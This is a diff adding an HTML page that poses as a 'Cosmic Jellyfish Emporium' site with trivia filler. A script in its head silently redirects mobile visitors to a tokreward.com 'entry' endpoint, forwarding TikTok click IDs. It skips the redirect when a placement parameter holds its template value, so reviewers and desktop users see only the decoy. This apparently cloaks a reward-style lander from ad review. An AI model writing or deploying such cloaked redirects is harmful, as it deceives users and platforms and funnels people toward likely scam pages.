@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://tokreward.com/api/v5/entry?s1=${s}&ttclid=${ttclid}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Jellyfish Emporium</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            color: #ffffff;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+        header {
+            grid-column: 1 / -1;
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+        }
+        main {
+            grid-column: 2 / 3;
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 15px;
+        }
+        aside {
+            background-color: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border-radius: 15px;
+        }
+        footer {
+            grid-column: 1 / -1;
+            text-align: center;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 10px;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px #ff00ff;
+        }
+        a {
+            color: #ffff00;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Cosmic Jellyfish Emporium</h1>
+        </header>
+        <aside>
+            <h2>Tentacle Trivia</h2>
+            <p>Did you know jellyfish have been around for over 500 million years?</p>
+        </aside>
+        <main>
+            <h2>Welcome to our Bioluminescent Bazaar</h2>
+            <p>Explore the wonders of the deep sea with our exotic jellyfish collection!</p>
+        </main>
+        <aside>
+            <h2>Jelly Jargon</h2>
+            <p>A group of jellyfish is called a bloom, swarm, or smack.</p>
+        </aside>
+        <footer>
+            <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+        </footer>
+    </div>
+</body>
+</html>
